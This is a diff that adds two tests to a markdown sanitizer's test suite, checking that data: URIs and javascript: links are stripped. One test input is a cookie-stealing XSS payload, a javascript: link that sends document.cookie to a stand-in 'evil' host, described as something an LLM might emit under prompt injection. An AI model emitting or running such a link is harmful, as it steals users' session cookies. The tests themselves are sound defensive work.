@@ -42,4 +42,19 @@ describe('sanitizeMarkdown (S4)', () => {
     const html = sanitizeMarkdown('[insecure](http://example.com)');
     expect(html).not.toContain('http://example.com');
   });
+
+  it('drops data: URIs for ALL types, not just text/html (pins no-data-uri invariant)', () => {
+    // Ensure data: URIs are blocked regardless of MIME type (image/png, etc.).
+    // This is independent of ALLOWED_TAGS — even if img were ever allowed, data: must not leak.
+    const html = sanitizeMarkdown('[x](data:image/png;base64,abc)');
+    expect(html).not.toContain('data:');
+  });
+
+  it('drops LLM-emitted prompt-injection: encoded javascript: scheme in link href', () => {
+    // An LLM may emit a link with a javascript: URL as a prompt-injection payload.
+    // Assert the output contains no javascript: scheme and no executable handler.
+    const html = sanitizeMarkdown("[click](javascript:fetch('https://evil/?c='+document.cookie))");
+    expect(html).not.toContain('javascript:');
+    expect(html).not.toContain('document.cookie');
+  });
 });
